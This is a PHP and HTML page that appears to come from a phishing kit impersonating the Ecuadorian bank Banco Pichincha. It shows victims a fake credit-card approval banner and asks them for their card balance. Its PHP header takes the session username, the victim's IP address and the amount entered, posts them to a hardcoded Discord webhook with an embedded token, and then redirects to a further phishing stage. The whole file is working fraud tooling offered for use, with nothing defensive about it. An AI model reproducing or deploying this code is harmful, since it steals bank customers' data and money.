<?php
session_start();

// Función para obtener la IP real
function getRealIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ipList[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'IP no disponible';
}

// Función para enviar mensaje a Discord
function enviarDiscord($mensaje) {
    $webhook_url = 'https://discord.com/api/webhooks/1422242742737702954/k-MYR11xDLnH7kQBukhTbYXX9qz34ts5JW2wXrPFonBYcNHvHa2FxMstc-uLG7w8vUa8';

    $data = ['content' => $mensaje];

    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    $response = curl_exec($ch);
    curl_close($ch);
}

// Si se envía el formulario
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $usuario = $_SESSION['usuario'] ?? 'No definido';
    $monto = $_POST['monto'] ?? '';

    // Validar monto
    if (!is_numeric($monto) || floatval($monto) <= 0) {
        header("Location: clave-digital.php");
        exit;
    }

    $ip_cliente = getRealIP();

    $mensaje = "**monto**\n**Usuario:** `$usuario`\n**Monto USDT:** `$monto`\n**IP:** `$ip_cliente`";

    enviarDiscord($mensaje);

    header("Location: index5.php");
    exit;
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Ingreso de Monto - Banco Pichincha</title>
  <style>
    :root {
      --primary-color: #F9D616;
      --accent-color: #003366;
    }
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #fffbe6, #fdf9d6);
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      flex-direction: column;
    }
    .floating-box {
      background: rgba(255, 255, 255, 0.7);
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255, 255, 255, 0.3);
      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
      border-radius: 12px;
      padding: 15px 20px;
      text-align: center;
      color: #003366;
      font-size: 15px;
      margin-bottom: 20px;
      width: 320px;
      animation: slideDown 0.5s ease-in-out;
    }
    .floating-box strong {
      display: block;
      font-size: 12px;
      margin-bottom: 2px;
      color: #000;
    }
    @keyframes slideDown {
      from { opacity: 0; transform: translateY(-20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .card {
      background: rgba(255, 255, 255, 0.6);
      backdrop-filter: blur(16px);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
      padding: 40px 30px;
      border-radius: 20px;
      width: 330px;
      text-align: center;
      border: 1px solid rgba(255, 255, 255, 0.18);
      animation: fadeIn 0.5s ease-in-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }
    h2 {
      color: var(--accent-color);
      font-weight: 600;
      margin-bottom: 15px;
    }
    p {
      color: #333;
      font-size: 14px;
      margin-bottom: 25px;
    }
    input[type="number"] {
      width: 100%;
      padding: 12px;
      font-size: 16px;
      text-align: center;
      border: none;
      border-radius: 12px;
      background: #ffffffcc;
      box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.1);
      transition: all 0.25s ease;
      margin-bottom: 20px;
    }
    input[type="number"]:focus {
      outline: none;
      transform: scale(1.05);
      box-shadow: 0 0 8px #f9d616a6;
    }
    .buttons {
      display: flex;
      gap: 20px;
      justify-content: center;
    }
    .buttons button {
      flex: 1;
      padding: 12px;
      font-size: 15px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: 0.3s;
    }
    .volver {
      background-color: #e0e0e0;
      color: #333;
    }
    .confirmar {
      background-color: var(--primary-color);
      color: #000;
      font-weight: bold;
    }
    .volver:hover,
    .confirmar:hover {
      transform: scale(1.05);
    }
  </style>
</head>
<body>

  <div class="floating-box">
    <strong>Tarjeta de Crédito Aprobado por $9.700</strong>
  </div>

  <div class="card">
    <h2>Saldo Actual En Su Tarjeta</h2>
    <p>Por favor, ingrese el monto actual de su tarjeta ingresada.</p>

    <form method="POST" action="">
      <input type="number" name="monto" step="0.01" min="0.01" placeholder="Ej: 250.00" required />

      <div class="buttons">
        <button type="button" class="volver" onclick="history.back()">Volver</button>
        <button type="submit" class="confirmar">Confirmar</button>
      </div>
    </form>
  </div>

</body>
</html>
